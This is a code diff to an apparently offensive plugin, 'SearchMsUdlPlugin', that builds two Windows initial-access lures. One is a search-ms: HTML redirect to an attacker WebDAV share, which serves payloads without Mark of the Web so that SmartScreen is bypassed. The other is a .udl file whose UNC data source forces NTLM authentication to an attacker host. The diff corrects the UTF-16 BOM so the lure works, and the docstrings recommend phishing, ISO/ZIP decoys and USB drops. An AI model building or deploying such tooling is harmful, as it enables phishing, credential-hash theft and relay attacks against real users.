@@ -5,12 +5,12 @@ Author: Whispergate
 search-ms WebDAV delivery:
   Generates an HTML page that triggers the Windows Search protocol handler
   (search-ms:) to open a WebDAV share in Explorer. Files on the share are
-  presented without MOTW — bypassing SmartScreen on delivered payloads.
+  presented without MOTW - bypassing SmartScreen on delivered payloads.
 
   Attack flow:
     1. HTML page with window.location = 'search-ms:query=test&crumb=location:\\\\attacker@SSL\\share'
     2. Windows Search opens Explorer showing attacker's WebDAV share
-    3. User double-clicks payload — no MOTW, no SmartScreen prompt
+    3. User double-clicks payload - no MOTW, no SmartScreen prompt
 
   Infrastructure: WebDAV server on port 443 with /share path.
   Recommended: Impacket smbserver or responder WebDAV module.
@@ -18,7 +18,7 @@ search-ms WebDAV delivery:
 UDL (Universal Data Link) Net-NTLM coercion:
   .udl files are OLE compound documents parsed by oledb32.dll.
   When opened, Windows immediately attempts to connect to the specified
-  data source — including UNC paths — forcing NTLM authentication.
+  data source - including UNC paths - forcing NTLM authentication.
   Captured hashes can be cracked offline or relayed to SMB/LDAP.
 
   Ideal for: ISO/ZIP containers, phishing attachments, USB drops.
@@ -80,7 +80,7 @@ class SearchMsUdlPlugin(ErebusPlugin):
 
         When opened in a browser, the page redirects to a search-ms: URI that
         instructs Windows Search / Explorer to display the WebDAV share.
-        Files served from the share have no MOTW — the user can execute them
+        Files served from the share have no MOTW - the user can execute them
         without SmartScreen intervention.
 
         Args:
@@ -189,7 +189,7 @@ function {fn_name}() {{
 
         When a user double-clicks the .udl file, oledb32.dll immediately
         attempts to connect to the specified data source.  UNC paths force
-        NTLM authentication — captured hashes can be cracked or relayed.
+        NTLM authentication - captured hashes can be cracked or relayed.
 
         Delivery: place in ISO/ZIP container alongside a decoy document.
         The .udl icon resembles a settings/database file; many users open
@@ -205,9 +205,7 @@ function {fn_name}() {{
         Returns:
             Path to the created .udl file.
         """
-        # UDL files are plain text with a specific BOM and header
-        udl_content = (
-            "\xff\xfe"  # UTF-16 LE BOM — required by oledb32.dll
+        udl_text = (
             "[oledb]\r\n"
             "; Everything after this line is an OLE DB initstring\r\n"
             f"Provider={provider};Data Source=\\\\{attacker_host}\\{share_name};"
@@ -218,8 +216,10 @@ function {fn_name}() {{
         out_dir.mkdir(parents=True, exist_ok=True)
         out_path = out_dir / output_filename
 
-        # Write as binary to preserve exact BOM
-        out_path.write_bytes(udl_content.encode("utf-16-le"))
+        # BOM must be raw bytes (0xFF 0xFE), then body encoded as UTF-16 LE.
+        # Writing "\xff\xfe" as a str then encoding with utf-16-le would expand
+        # each char to 2 bytes (FF 00, FE 00) - oledb32.dll rejects that header.
+        out_path.write_bytes(b"\xff\xfe" + udl_text.encode("utf-16-le"))
         return out_path
 
 
